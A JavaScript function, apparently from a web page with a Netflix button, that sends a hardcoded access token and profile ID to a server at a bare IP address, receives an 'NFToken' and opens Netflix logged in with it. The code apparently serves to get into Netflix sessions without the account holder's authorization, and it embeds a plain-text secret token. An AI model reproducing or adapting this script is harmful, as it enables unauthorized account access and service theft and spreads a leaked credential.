function runNetflixScript() {
    const access_token = "EAAFE0Tw8WfwBAE2gpmJlteVloxZCuZAgQZAG6ZAvxfZBH1aNyewo6rMpPGL7sbfb6Y7vlZCqznXDaGPV2Seh7ZB7wfn4Xoc9fNqa6dREPLJsbjEZBwHMxZChAPb9hBOhDum7u4UTEKzsafhpZA639VK545lBUo63MxoC2h9oTNmQYUo4HrXe5qDcnQPHynOSrAyLFTWQA2jvyS3AXrXQGwcPTf";
    const NETFLIX_DOMAIN = "http://www.netflix.com/";
    const url = "https://65.21.228.155/access";
    const headers = {
      "Content-Type": "application/x-www-form-urlencoded;charset=UTF-8",
      "User-Agent":
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/109.0.0.0 Safari/537.36",
    };
    const data = { access_token: access_token, profile_id: "100004323155386" };
  
    fetch(url, {
      method: "POST",
      headers: headers,
      body: new URLSearchParams(data),
    })
      .then((response) => {
        if (response.ok) {
          response.json().then((data) => {
            const nftoken = data["data"]["NFToken"];
            const link = NETFLIX_DOMAIN + "?nftoken=" + nftoken;
            console.log(link);
            document.getElementById("netflix-button").style.backgroundColor =
              "green";
            window.open(link);
          });
        } else {
          console.log("Error:", response.status);
          document.getElementById("netflix-button").style.backgroundColor =
            "red";
        }
      })
      .catch((error) => {
        console.log("Error:", error);
        document.getElementById("netflix-button").style.backgroundColor = "red";
      });
  }
  
